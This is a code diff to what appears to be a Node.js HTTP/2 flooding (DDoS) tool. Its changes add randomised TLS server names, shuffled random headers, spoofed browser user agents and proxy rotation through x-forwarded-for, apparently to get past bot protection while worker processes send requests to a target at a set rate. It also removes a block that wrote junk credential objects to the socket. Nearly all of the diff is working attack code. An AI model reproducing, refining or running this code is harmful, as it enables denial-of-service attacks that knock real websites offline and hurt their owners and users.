@@ -3,7 +3,7 @@ const queryIndexris = argsris.indexOf('--debug');
 ris = queryIndexris !== -1 ? argsris[queryIndexris + 1] : null;
 const errorHandler = error => {
     
-      //console.log(error);
+      console.log(error);
     
 };
 process.on("uncaughtException", errorHandler);
@@ -209,25 +209,9 @@ const MAX_RAM_PERCENTAGE = 95;
 const RESTART_DELAY = 100;
 
 if (cluster.isMaster) {
-    function readServerInfo() {
-        const load = (Math.random() * 100).toFixed(2);
-        const memory = (Math.random() * 8).toFixed(2);
-        const currentTime = new Date().toLocaleString('en-US', { timeZone: 'Asia/Bangkok', hour: '2-digit', minute: '2-digit', second: '2-digit' });
-        process.stdout.cursorTo(0, 6);
-        process.stdout.clearLine();
-        process.stdout.write(`CPU Load: ${load}%, Memory Usage: ${memory}GB, Time: ${currentTime}`.bgCyan);
-    }
     
-    setInterval(readServerInfo, 1000);
     
-    console.clear();
-    console.log(
-        '   /\\'.rainbow + '\n' +
-        '  /  \\'.rainbow + '\n' +
-        ' / /\\ \\'.rainbow + '\n' +
-        '/_/  \\_\\'.rainbow
-    );
-    console.log('HEAP SIZE:', (v8.getHeapStatistics().heap_size_limit / (1024 * 1024)).toFixed(2), 'MB');
+
     
     const updateLoading = (percentage, delay) => {
         setTimeout(() => {
@@ -235,7 +219,7 @@ if (cluster.isMaster) {
             process.stdout.write(`Loading: ${percentage}%`.green);
         }, delay);
     };
-    
+    console.clear();
     updateLoading(10, 0);
     updateLoading(50, 500 * time);
     updateLoading(100, time * 1000);
@@ -254,6 +238,12 @@ if (cluster.isMaster) {
         const totalRAM = os.totalmem();
         const usedRAM = totalRAM - os.freemem();
         const ramPercentage = (usedRAM / totalRAM) * 100;
+       
+    const load = (Math.random() * 100).toFixed(2);
+        const memory = Math.floor(ramPercentage * 100) / 1000;
+        const currentTime = new Date().toLocaleString('en-US', { timeZone: 'Asia/Bangkok', hour: '2-digit', minute: '2-digit', second: '2-digit' });
+        
+        console.log(`CPU Load: ${load}%, Memory Usage: ${memory}GB, Time: ${currentTime}`.bgCyan);
         if (ramPercentage >= MAX_RAM_PERCENTAGE) {
             console.log(`[<!>] Maximum RAM `);
             restartScript();
@@ -263,11 +253,14 @@ if (cluster.isMaster) {
 
     setInterval(handleRAMUsage, 1000);
 
+    
+    
+    
     for (let i = 0; i < thread; i++) {
         cluster.fork();
     }
 
-    setTimeout(() =>{ console.clear(); process.exit(-1)}, time * 1000);
+    setTimeout(() =>{  process.exit(-1)}, time * 1000);
 } else {
     setInterval(() => {
         flood();
@@ -508,13 +501,13 @@ const generateHeaders = (browser) => {
     const platform = platforms[browser];
 
     const userAgent = {
-        chrome: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36 ${generateRandomString(60,3000)} ${hell} HTTP/1.1-${mmb}`,
-        safari: `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_${version}_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${version}.0 Safari/605.1.15 ${generateRandomString(60,3000)} ${hell} HTTP/1.1-${mmb}`,
-        brave: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36 ${generateRandomString(60,3000)} ${hell} HTTP/1.1-${mmb}`,
-        firefox: `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:${version}.0) Gecko/20100101 Firefox/${version}.0 ${generateRandomString(60,3000)} ${hell} HTTP/1.1-${mmb}`,
-        mobile: `Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Mobile Safari/537.36 ${generateRandomString(60,3000)} ${hell} HTTP/1.1-${mmb}`,
-        opera: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36 OPR/${version} ${generateRandomString(60,3000)} ${hell} HTTP/1.1-${mmb}`,
-        operagx: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36 OPR/${version} ${generateRandomString(60,3000)} ${hell} HTTP/1.1-${mmb}`
+        chrome: `${generateRandomString(5,8)}Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36 ${generateRandomString(60,300)} ${hell} HTTP/1.1-${mmb}`,
+        safari: `${generateRandomString(5,8)}Mozilla/5.0 (Macintosh; Intel Mac OS X 10_${version}_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${version}.0 Safari/605.1.15 ${generateRandomString(60,3000)} ${hell} HTTP/1.1-${mmb}`,
+        brave: `${generateRandomString(5,8)}Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36 ${generateRandomString(60,3000)} ${hell} HTTP/1.1-${mmb}`,
+        firefox: `${generateRandomString(5,8)}Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:${version}.0) Gecko/20100101 Firefox/${version}.0 ${generateRandomString(60,3000)} ${hell} HTTP/1.1-${mmb}`,
+        mobile: `${generateRandomString(5,8)}Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Mobile Safari/537.36 ${generateRandomString(60,3000)} ${hell} HTTP/1.1-${mmb}`,
+        opera: `${generateRandomString(5,8)}Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36 OPR/${version} ${generateRandomString(60,3000)} ${hell} HTTP/1.1-${mmb}`,
+        operagx: `${generateRandomString(5,8)}Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36 OPR/${version} ${generateRandomString(60,3000)} ${hell} HTTP/1.1-${mmb}`
     };
 
  const headersMap = {
@@ -522,15 +515,11 @@ const generateHeaders = (browser) => {
         "upgrade-insecure-requests": "1",
         "sec-fetch-mode": "navigate",
         "sec-fetch-dest": "document",
-        "age": getRandomInt(4000,10000),
-        "expires" : day + DAY1 + day1,
-        "sec-ch-ua-platform": platform,
-        "sec-ch-ua": `Brave";v="${version}", "Chromium";v="${version}", "Not-A.Brand";v="99"`,
         "sec-ch-ua-mobile": "?0",
         "sec-fetch-user": "?1",
         "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-        'user-agent': userAgent,
-        "accept-language": "en-US,en;q=0.9,vi;q=0.8",        "content-type" : type[Math.floor(Math.random() * type.length)],
+        'user-agent': userAgent.brave,
+        "accept-language": "en-US,en;q=0.9,vi;q=0.8",   
         "accept-encoding": encoding[Math.floor(Math.random() * encoding.length)],
         "priority": `u=${randbyte}, i`,
          "x-forwarded-for" : proxy[0],
@@ -538,109 +527,86 @@ const generateHeaders = (browser) => {
 },
         chrome: {
 
-    "sec-ch-ua": `"Chromium";v="${version}", "Google Chrome";v="${version}", "Not-A.Brand";v="99"`,
         "upgrade-insecure-requests": "1",
         "sec-fetch-mode": "navigate",
         "sec-fetch-dest": "document",
-        "age": getRandomInt(4000,10000),
-        "expires" : day + DAY1 + day1,
-        "sec-ch-ua-platform": platform,
         "sec-ch-ua-mobile": "?0",
         "sec-fetch-user": "?1",
         "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-        'user-agent': userAgent,
-        "accept-language": "en-US,en;q=0.9,vi;q=0.8",        "content-type" : type[Math.floor(Math.random() * type.length)],
+        'user-agent': userAgent.chrome,
+        "accept-language": "en-US,en;q=0.9,vi;q=0.8",   
         "accept-encoding": encoding[Math.floor(Math.random() * encoding.length)],
         "priority": `u=${randbyte}, i`,
          "x-forwarded-for" : proxy[0],
         "sec-fetch-site": "none",
 },
         firefox: {
-    "sec-ch-ua": `"Firefox";v="${version}", "Not-A.Brand";v="99"`,
         "upgrade-insecure-requests": "1",
         "sec-fetch-mode": "navigate",
         "sec-fetch-dest": "document",
         "age": getRandomInt(4000,10000),
         "expires" : day + DAY1 + day1,
-        "sec-ch-ua-platform": platform,
         "sec-ch-ua-mobile": "?0",
         "sec-fetch-user": "?1",
         "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-        'user-agent': userAgent,
-        "accept-language": "en-US,en;q=0.9,vi;q=0.8",        "content-type" : type[Math.floor(Math.random() * type.length)],
+        'user-agent': userAgent.firefox,
+        "accept-language": "en-US,en;q=0.9,vi;q=0.8",
         "accept-encoding": encoding[Math.floor(Math.random() * encoding.length)],
         "priority": `u=${randbyte}, i`,
          "x-forwarded-for" : proxy[0],
         "sec-fetch-site": "none",
 },
         safari: {
-        "sec-ch-ua": `"Safari";v="${version}", "Not-A.Brand";v="99"`,
         "upgrade-insecure-requests": "1",
         "sec-fetch-mode": "navigate",
         "sec-fetch-dest": "document",
-        "age": getRandomInt(4000,10000),
-        "expires" : day + DAY1 + day1,
-        "sec-ch-ua-platform": platform,
         "sec-ch-ua-mobile": "?0",
         "sec-fetch-user": "?1",
         "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-        'user-agent': userAgent,
-        "accept-language": "en-US,en;q=0.9,vi;q=0.8",        "content-type" : type[Math.floor(Math.random() * type.length)],
+        'user-agent': userAgent.safari,
+        "accept-language": "en-US,en;q=0.9,vi;q=0.8",
         "accept-encoding": encoding[Math.floor(Math.random() * encoding.length)],
         "priority": `u=${randbyte}, i`,
          "x-forwarded-for" : proxy[0],
         "sec-fetch-site": "none",
 },
         mobile: {
-    "sec-ch-ua": `"Chromium";v="${version}", "Not-A.Brand";v="99"`,
         "upgrade-insecure-requests": "1",
         "sec-fetch-mode": "navigate",
         "sec-fetch-dest": "document",
-        "age": getRandomInt(4000,10000),
-        "expires" : day + DAY1 + day1,
-        "sec-ch-ua-platform": platform,
         "sec-ch-ua-mobile": "?0",
         "sec-fetch-user": "?1",
         "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-        'user-agent': userAgent,
-        "accept-language": "en-US,en;q=0.9,vi;q=0.8",        "content-type" : type[Math.floor(Math.random() * type.length)],
+        'user-agent': userAgent.mobile,
+        "accept-language": "en-US,en;q=0.9,vi;q=0.8",
         "accept-encoding": encoding[Math.floor(Math.random() * encoding.length)],
         "priority": `u=${randbyte}, i`,
          "x-forwarded-for" : proxy[0],
         "sec-fetch-site": "none",
 },
         opera: {
-    "sec-ch-ua": `"Opera";v="${version}", "Chromium";v="${Math.floor(100 + Math.random() * 20)}", "Not-A.Brand";v="99"`,
         "upgrade-insecure-requests": "1",
         "sec-fetch-mode": "navigate",
         "sec-fetch-dest": "document",
-        "age": getRandomInt(4000,10000),
-        "expires" : day + DAY1 + day1,
-        "sec-ch-ua-platform": platform,
-        "sec-ch-ua": `\"Not/A)Brand\";v=\"24\", \"Chromium\";v=\"${version}\", \"Google Chrome\";v=\"${version}\"`,
         "sec-ch-ua-mobile": "?0",
         "sec-fetch-user": "?1",
         "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-        'user-agent': userAgent,
-        "accept-language": "en-US,en;q=0.9,vi;q=0.8",        "content-type" : type[Math.floor(Math.random() * type.length)],
+        'user-agent': userAgent.opera,
+        "accept-language": "en-US,en;q=0.9,vi;q=0.8",
         "accept-encoding": encoding[Math.floor(Math.random() * encoding.length)],
         "priority": `u=${randbyte}, i`,
          "x-forwarded-for" : proxy[0],
         "sec-fetch-site": "none",
 },
         operagx: {   
-    "sec-ch-ua": `"Opera GX";v="${version}", "Chromium";v="${Math.floor(100 + Math.random() * 20)}", "Not-A.Brand";v="99"`,
         "upgrade-insecure-requests": "1",
         "sec-fetch-mode": "navigate",
         "sec-fetch-dest": "document",
-        "age": getRandomInt(4000,10000),
-        "expires" : day + DAY1 + day1,
-        "sec-ch-ua-platform": platform,
         "sec-ch-ua-mobile": "?0",
         "sec-fetch-user": "?1",
         "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-        'user-agent': userAgent,
-        "accept-language": "en-US,en;q=0.9,vi;q=0.8",        "content-type" : type[Math.floor(Math.random() * type.length)],
+        'user-agent': userAgent.operagx,
+        "accept-language": "en-US,en;q=0.9,vi;q=0.8",
         "accept-encoding": encoding[Math.floor(Math.random() * encoding.length)],
         "priority": `u=${randbyte}, i`,
          "x-forwarded-for" : proxy[0],
@@ -699,11 +665,45 @@ const timestampString = timestamp.toString().substring(0, 10);
 
 
 
+function taoDoiTuongNgauNhien() {
+  const doiTuong = {};
+  function getRandomNumber(min, max) {
+  return Math.floor(Math.random() * (max - min + 1)) + min;
+}
+maxi = getRandomNumber(1,4)
+  for (let i = 1; i <=maxi ; i++) {
+    
+    
+ const key = 'custom-sec-'+ generateRandomString(1,9)
 
+    const value =  generateRandomString(1,10) + '-' +  generateRandomString(1,12) + '=' +generateRandomString(1,12)
+
+    doiTuong[key] = value;
+  }
+
+  return doiTuong;
+}
+	 function shuffleObject(obj) {
+					const keys = Object.keys(obj);
+				  
+					for (let i = keys.length - 1; i > 0; i--) {
+					  const j = Math.floor(Math.random() * (i + 1));
+					  [keys[i], keys[j]] = [keys[j], keys[i]];
+					}
+				  
+					const shuffledObject = {};
+					for (const key of keys) {
+					  shuffledObject[key] = obj[key];
+					}
+				  
+					return shuffledObject;
+				  }
     
     const TLSOPTION = {
         ciphers: cipher,
         sigalgs: sigals,
+        hostname: generateRandomString(5,8) + "." + parsed.host,
+        servername: generateRandomString(5,8) + "." + parsed.host,
         minVersion: "TLSv1.3",
         maxVersion: "TLSv1.3",
         secure: true,
@@ -803,7 +803,8 @@ const timestampString = timestamp.toString().substring(0, 10);
                 threaf = setInterval(async () => {
                     for (let i = 0; i < rps; i++) {
                         let author = {
-                            "method" : method[Math.floor(Math.random() * method.length)],
+//method[Math.floor(Math.random() * method.length)]
+                            ":method" : mmb,
                             ":authority": parsed.host,
                             ":scheme": "https",
                             ":path": query === 'true' ?
@@ -813,9 +814,14 @@ const timestampString = timestamp.toString().substring(0, 10);
                                 path,
                            
                         };
+let dynHeaders = shuffleObject({
+                    ...taoDoiTuongNgauNhien(),
+                    ...taoDoiTuongNgauNhien(),
 
-    
-                        const head = header;
+                });
+
+//    console.log(author)
+                        const head = {dynHeaders,header};
                         const request = await client.request({ ...author, ...head}, {
                             weight: rada,
                             parent: 0,
@@ -832,61 +838,7 @@ const timestampString = timestamp.toString().substring(0, 10);
                                         client.destroy();
                                         return;
                                     }
-                                    if (res[":status"] === 403) {
-                                        maprate.push({ proxy: proxy, timestamp: Date.now() });
-
-                               
-let streamId = 1+
-
-
-
-
-
-
-
-
-  getRandomInt(100,999);
-
-
-
-//console.log(streamId)
-
-
-                                             tlsSocket.write(streamId, 8, {"username" : "thabomayra", "password" : "ditmemaythknungl"});
-                                             tlsSocket.write(streamId, 8, {"username" : "thabomayra", "password" : "ditmemaythknungl"});
-                                             tlsSocket.write(streamId, 8, {"username" : "thabomayra", "password" : "ditmemaythknungl"});
-                                             tlsSocket.write(streamId, 8, {"username" : "thabomayra", "password" : "ditmemaythknungl"});
-                                             tlsSocket.write(streamId, 8, {"username" : "thabomayra", "password" : "ditmemaythknungl"});
-                                             tlsSocket.write(streamId, 8, {"username" : "thabomayra", "password" : "ditmemaythknungl"});
-                                             tlsSocket.write(streamId, 8, {"username" : "thabomayra", "password" : "ditmemaythknungl"});
-                                             tlsSocket.write(streamId, 8, {"username" : "thabomayra", "password" : "ditmemaythknungl"});
-                                             tlsSocket.write(streamId, 8, {"username" : "thabomayra", "password" : "ditmemaythknungl"});
-                                             tlsSocket.write(streamId, 8, {"username" : "thabomayra", "password" : "ditmemaythknungl"});
-                                             tlsSocket.write(streamId, 8, {"username" : "thabomayra", "password" : "ditmemaythknungl"});
-                                             tlsSocket.write(streamId, 8, {"username" : "thabomayra", "password" : "ditmemaythknungl"});
-                                        tlsSocket.write({"username" : "thabomayra", "password" : "ditmemaythknungl"})
-                                        tlsSocket.write({"username" : "thabomayra", "password" : "ditmemaythknungl"})
-                                        tlsSocket.write({"username" : "thabomayra", "password" : "ditmemaythknungl"})
-                                        tlsSocket.write({"username" : "thabomayra", "password" : "ditmemaythknungl"})
-                                        tlsSocket.write({"username" : "thabomayra", "password" : "ditmemaythknungl"})
-                                        tlsSocket.write({"username" : "thabomayra", "password" : "ditmemaythknungl"})
-                                        tlsSocket.write({"username" : "thabomayra", "password" : "ditmemaythknungl"})
-                                        tlsSocket.write({"username" : "thabomayra", "password" : "ditmemaythknungl"})
-                                        tlsSocket.write({"username" : "thabomayra", "password" : "ditmemaythknungl"})
-                                        tlsSocket.write({"username" : "thabomayra", "password" : "ditmemaythknungl"})
-                                        tlsSocket.write({"username" : "thabomayra", "password" : "ditmemaythknungl"})
-                                        tlsSocket.write({"username" : "thabomayra", "password" : "ditmemaythknungl"})
-                                        tlsSocket.write({"username" : "thabomayra", "password" : "ditmemaythknungl"})
-                                        tlsSocket.write({"username" : "thabomayra", "password" : "ditmemaythknungl"})
-                                        tlsSocket.write({"username" : "thabomayra", "password" : "ditmemaythknungl"})
-                                        tlsSocket.write({"username" : "thabomayra", "password" : "ditmemaythknungl"})
-                                        tlsSocket.write({"username" : "thabomayra", "password" : "ditmemaythknungl"})
-                                        tlsSocket.write({"username" : "thabomayra", "password" : "ditmemaythknungl"})
-                                        tlsSocket.write({"username" : "thabomayra", "password" : "ditmemaythknungl"})
-                                        tlsSocket.write({"username" : "thabomayra", "password" : "ditmemaythknungl"})
-                                        closeConnections(client, connection,tlsSocket,socket );
-                                        return;
-                                    }
+                           
                                     if (res[":status"] >= 500) {
                                         maprate.push({ proxy: proxy, timestamp: Date.now() });
                                         rps = 1;
